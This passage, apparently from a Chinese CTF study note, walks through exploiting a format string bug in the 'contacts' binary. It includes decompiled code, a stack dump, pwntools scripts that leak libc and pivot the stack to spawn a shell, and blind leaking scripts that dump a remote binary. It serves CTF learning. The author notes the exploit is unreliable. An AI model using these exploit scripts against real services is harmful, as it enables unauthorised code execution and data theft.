#0x4008aa-0x4008a6
sh.writeline("%2218d%8$hn")  # %2218d = 8AA

sh.recv()
sh.writeline("1")
sh.recv()
sh.interactive()
```



### 堆上的格式化字符串漏洞利用

在堆上进行利用操作



**程序保护分析**

```
checksec contacts 
[*] '/home/toor/Desktop/contacts'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

cannary  NX 都开启， 则对栈进行篡改的难度加大
```



**程序分析**

```c
int __cdecl main()
{
  int v1; // [esp+18h] [ebp-8h]
  int i; // [esp+1Ch] [ebp-4h]

  setvbuf(stdout, 0, 2, 0);
  for ( i = 0; i <= 9; ++i )
    memset((void *)(80 * i + 0x804B0A0), 0, 0x50u);
LABEL_11:
  while ( v1 != 5 )
  {
    printf("%s", menu);
    __isoc99_scanf("%u%*c", &v1);
    switch ( v1 )
    {
      case 1:
        CreatContact(people);    //创建账户
        break;
      case 2:                    //删除账户
        RemoveContact(people);
        break;
      case 3:
        ChangeName(people);      //更改名称
        break;
      case 4:
        PrintContact(people);    //打印信息
        break;
      case 5:
        goto LABEL_11;
      default:
        puts("Invalid option");
        break;
    }
  }
  puts("Thanks for trying out the demo, sadly your contacts are now erased");
  return 0;
}

逐个进行查看，发现比较明显的地方是


打印信息处
PrintInfo 函数


int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
{
  printf("\tName: %s\n", a1);
  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);
  printf("\tDescription: ");
  return printf(format);    《---比较明显的格式化字符串漏洞
}

向上追溯 format 这个参数，

 result = PrintInfo((int)v2->name, v2->des_len, (int)v2->phone, v2->description);
为 description  的信息

追溯到 des 的读入地址发现

char *__cdecl ReadDescription(contact *a1)
{
  char *result; // eax
  int v2; // [esp+1Ch] [ebp-Ch]

  printf("\tLength of description: ");
  __isoc99_scanf("%u%*c", &v2);
  a1->des_len = v2;
  a1->description = (char *)malloc(v2 + 1);     《------信息主要在堆上
  if ( !a1->description )
    exit(1);
  printf("\tEnter description:\n\t\t");
  fgets(a1->description, v2 + 1, stdin);
  result = a1->description;
  if ( !a1->description )
    exit(1);
  return result;
}

```



**利用思路：**

> 我们的基本目的是获取系统的 shell，从而拿到 flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持 got 表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下
>
> - 之所以不能够劫持 got 来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有 printf 函数，我们只有选择它才可以构造 /bin/sh 让它执行 system('/bin/sh')，但是 printf 函数在其他地方也均有用到，这样做会使得程序直接崩溃。
> - 其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入 system_addr + 'bbbb' + addr of '/bin/sh‘ 似乎并不现实。
>
> 可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过 leave 指令来进行栈迁移，所以在迁移之前我们需要修改程序保存 ebp 的值为我们想要的值。 只有这样在执行 leave 指令的时候， esp 才会成为我们想要的值。同时，因为我们是使用格式化字符串来进行修改，所以我们得知道保存 ebp 的地址为多少，而这时 PrintInfo 函数中存储 ebp 的地址每次都在变化，而我们也无法通过其他方法得知。但是，**程序中压入栈中的 ebp 值其实保存的是上一个函数的保存 ebp 值的地址**，所以我们可以修改其**上层函数的保存的 ebp 的值，即上上层函数（即 main 函数）的 ebp 数值**。这样当上层程序返回时，即实现了将栈迁移到堆的操作。

综上所述：需要采取迁移到堆上的利用方法， 迁移方法采用leave指令（movl ebp esp pop ebp）,  ebp 的不确定性，可以通过修改该上层函数的ebp 值来造成上层函数返回时实现栈迁移到堆



基本思路如下

- 相关地址与偏移
- 首先获取 system 函数的地址
  - 通过泄露某个 libc 函数的地址根据 libc database 确定。
- 构造基本联系人描述为 system_addr + 'bbbb' + binsh_addr
- 修改上层函数保存的 ebp(即上上层函数的 ebp) 为**存储 system_addr 的地址 -4**。
- 当主程序返回时，会有如下操作
  - move esp,ebp，将 esp 指向 system_addr 的地址 - 4
  - pop ebp， 将 esp 指向 system_addr
  - ret，将 eip 指向 system_addr，从而获取 shell。



**相关地址及偏移获取**

>  system 函数地址
>
> /bin/sh 地址
>
> 栈上存储联系人描述的地址
>
> PrintInfo 函数的地址



在printf 前端下来 利用 dereference $esp l140  查看栈中状态

```c
 dereference $esp l140
0xffffd010│+0x0000: 0x0804c420  →  0x00000000	 ← $esp
0xffffd014│+0x0004: 0x0804c410  →  "111111111"
0xffffd018│+0x0008: 0xf7e6714b  →  <puts+11> add ebx, 0x150eb5
0xffffd01c│+0x000c: 0x00000000
0xffffd020│+0x0010: 0xf7fb8000  →  0x001afdb0
0xffffd024│+0x0014: 0xf7fb8000  →  0x001afdb0
0xffffd028│+0x0018: 0xffffd058  →  0xffffd088  →  0x00000000	 ← $ebp
0xffffd02c│+0x001c: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1
0xffffd030│+0x0020: 0x0804b0a8  →  "dccgcccg"
0xffffd034│+0x0024: 0x00000000
0xffffd038│+0x0028: 0x0804c410  →  "111111111"
0xffffd03c│+0x002c: 0x0804c420  →  0x00000000
0xffffd040│+0x0030: 0xf7fb8d60  →  0xfbad2887
0xffffd044│+0x0034: 0x08048ed6  →  0x25007325 ("%s"?)
0xffffd048│+0x0038: 0x0804b0a0  →  0x0804c420  →  0x00000000
0xffffd04c│+0x003c: 0x00000000
0xffffd050│+0x0040: 0xf7fb8000  →  0x001afdb0
0xffffd054│+0x0044: 0x00000000
0xffffd058│+0x0048: 0xffffd088  →  0x00000000
0xffffd05c│+0x004c: 0x080487a2  →   jmp 0x80487b3
0xffffd060│+0x0050: 0x0804b0a0  →  0x0804c420  →  0x00000000
0xffffd064│+0x0054: 0xffffd078  →  0x00000004
0xffffd068│+0x0058: 0x00000050 ("P"?)
0xffffd06c│+0x005c: 0x00000000
0xffffd070│+0x0060: 0xf7fb83dc  →  0xf7fb91e0  →  0x00000000
0xffffd074│+0x0064: 0x08048288  →   (bad) 
0xffffd078│+0x0068: 0x00000004
0xffffd07c│+0x006c: 0x0000000a
0xffffd080│+0x0070: 0xf7fb8000  →  0x001afdb0
0xffffd084│+0x0074: 0xf7fb8000  →  0x001afdb0
0xffffd088│+0x0078: 0x00000000
0xffffd08c│+0x007c: 0xf7e20637  →  <__libc_start_main+247> add esp, 0x10 <-- 偏移31
0xffffd090│+0x0080: 0x00000001
0xffffd094│+0x0084: 0xffffd124  →  0xffffd2fe  →  "/home/toor/Desktop/contacts"
0xffffd098│+0x0088: 0xffffd12c  →  0xffffd31a  →  "XDG_VTNR=7"
0xffffd09c│+0x008c: 0x00000000
0xffffd0a0│+0x0090: 0x00000000
0xffffd0a4│+0x0094: 0x00000000
0xffffd0a8│+0x0098: 0xf7fb8000  →  0x001afdb0
0xffffd0ac│+0x009c: 0xf7ffdc04  →  0x00000000
0xffffd0b0│+0x00a0: 0xf7ffd000  →  0x00022f3c
0xffffd0b4│+0x00a4: 0x00000000
0xffffd0b8│+0x00a8: 0xf7fb8000  →  0x001afdb0
0xffffd0bc│+0x00ac: 0xf7fb8000  →  0x001afdb0
0xffffd0c0│+0x00b0: 0x00000000
0xffffd0c4│+0x00b4: 0x6566a302
0xffffd0c8│+0x00b8: 0x5ecc6d12
0xffffd0cc│+0x00bc: 0x00000000
0xffffd0d0│+0x00c0: 0x00000000
0xffffd0d4│+0x00c4: 0x00000000
0xffffd0d8│+0x00c8: 0x00000001
0xffffd0dc│+0x00cc: 0x080485c0  →   xor ebp, ebp
0xffffd0e0│+0x00d0: 0x00000000
0xffffd0e4│+0x00d4: 0xf7feeff0  →   pop edx
0xffffd0e8│+0x00d8: 0xf7fe9880  →   push ebp
0xffffd0ec│+0x00dc: 0xf7ffd000  →  0x00022f3c
0xffffd0f0│+0x00e0: 0x00000001
0xffffd0f4│+0x00e4: 0x080485c0  →   xor ebp, ebp


偏移计算
fmtarg 0xffffd08c
The index of format argument : 31
gef➤  fmtarg 0xffffd03c
The index of format argument : 11    格式化字符串地址
fmtarg 0xffffd028
The index of format argument : 6     存上层ebp地址
```

**获取描述堆地址**

```
[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
```

在部分环境下，system 地址会出现 \ x00，导致 printf 的时候出现 0 截断导致无法泄露两个地址，因此可以将 payload 的修改如下：

```
[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
```

payload 修改为这样的话，还需要在 heap 上加入 12 的偏移。这样保证了 0 截断出现在泄露之后。

由于我们需要执行 move 指令将 ebp 赋给 esp，并还需要执行 pop ebp 才会执行 ret 指令，所以我们需要将 ebp 修改为存储 system 地址 -4 的值。这样 pop ebp 之后，esp 恰好指向保存 system 的地址，这时在执行 ret 指令即可执行 system 函数。

上面已经得知了我们希望修改的 ebp 值，而也知道了对应的偏移为 11，所以我们可以构造如下的 payload 来进行修改相应的值。

```
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
```

#### 获取 shell[¶](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example/#shell)

这时，执行完格式化字符串函数之后，退出到上上函数，我们输入 5，退出程序即会执行 ret 指令，就可以获取 shell。

#### 利用程序 [¶](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example/#_30)



```
from pwn import *
from LibcSearcher import *
contact = ELF('./contacts')
##context.log_level = 'debug'
if args['REMOTE']:
    sh = remote(11, 111)
else:
    sh = process('./contacts')


def createcontact(name, phone, descrip_len, description):
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)


def printcontact():
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')


## get system addr & binsh_addr
payload = '%31$paaaa'
createcontact('1111', '1111', '111', payload)
printcontact()
libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)
log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))
libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.success('get system addr: ' + hex(system_addr))
log.success('get binsh addr: ' + hex(binsh_addr))
##gdb.attach(sh)

## get heap addr and ebp addr
payload = flat([
    system_addr,
    'bbbb',
    binsh_addr,
    '%6$p%11$pcccc',
])
createcontact('2222', '2222', '222', payload)
printcontact()
sh.recvuntil('Description: ')
data = sh.recvuntil('cccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)

## modify ebp
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
##print payload
createcontact('3333', '123456789', '300', payload)
printcontact()
sh.recvuntil('Description: ')
sh.recvuntil('Description: ')
##gdb.attach(sh)
print 'get shell'
sh.recvuntil('>>> ')
##get shell
sh.sendline('5')
sh.interactive()
```

system 出现 0 截断的情况下，exp 如下:

```
from pwn import *
context.log_level="debug"
context.arch="x86"

io=process("./contacts")
binary=ELF("contacts")
libc=binary.libc

def createcontact(io, name, phone, descrip_len, description):
    sh=io
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)
def printcontact(io):
    sh=io
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')

#gdb.attach(io)

createcontact(io,"1","1","111","%31$paaaa")
printcontact(io)
libc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241
log.success('get libc_start_main addr: ' + hex(libc_start_main))
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
system=libc_base+libc.symbols["system"]
binsh=libc_base+next(libc.search("/bin/sh"))
log.success("system: "+hex(system))
log.success("binsh: "+hex(binsh))

payload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+"dddd"
createcontact(io,'2', '2', '111', payload)
printcontact(io)
io.recvuntil('Description: ')
data = io.recvuntil('ccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)+12
log.success("ebp: "+hex(system))
log.success("heap: "+hex(heap_addr))

part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'

#payload=fmtstr_payload(6,{ebp_addr:heap_addr})
##print payload
createcontact(io,'3333', '123456789', '300', payload)
printcontact(io)
io.recvuntil('Description: ')
io.recvuntil('Description: ')
##gdb.attach(sh)
log.success("get shell")
io.recvuntil('>>> ')
##get shell
io.sendline('5')
io.interactive()
```



需要注意的是，这样并不能稳定得到 shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。

为什么需要打印这么多呢？因为格式化字符串不在栈上，所以就算我们得到了需要更改的 ebp 的地址，也没有办法去把这个地址写到栈上，利用 $ 符号去定位他；因为没有办法定位，所以没有办法用 l\ll 等方式去写这个地址，所以只能打印很多。





持续验证不成功，后续继续看看这个题目





 **格式化字符串盲打**



类似BROP，思路

- 确定程序的位数
- 确定漏洞位置
- 利用

**确认程序位数**

通过NC连接

根据 %p 输出内存宽度 可以看出位数



模糊泄漏方法

```python
from pwn import *
context.log_level = 'error'


def leak(payload):
    sh = remote('127.0.0.1', 9999)
    sh.sendline(payload)
    data = sh.recvuntil('\n', drop=True)
    if data.startswith('0x'):
        print p64(int(data, 16))
    sh.close()


i = 1
while 1:
    payload = '%{}$p'.format(i)  逐个泄漏来获取数据
    leak(payload)
    i += 1
```



盲打got方法

确认程序位数：通过nc 连接后 %p 来判断

确定偏移： aaa%p%p%p 等简单方法来做

进行内容泄漏：

```python
##coding=utf8
from pwn import *

##context.log_level = 'debug'
ip = "127.0.0.1"
port = 9999


def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # 说明有\n，出现新的一行
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None

def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x401000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()
getbinary()
```

针对泄漏binary进行IDA分析。

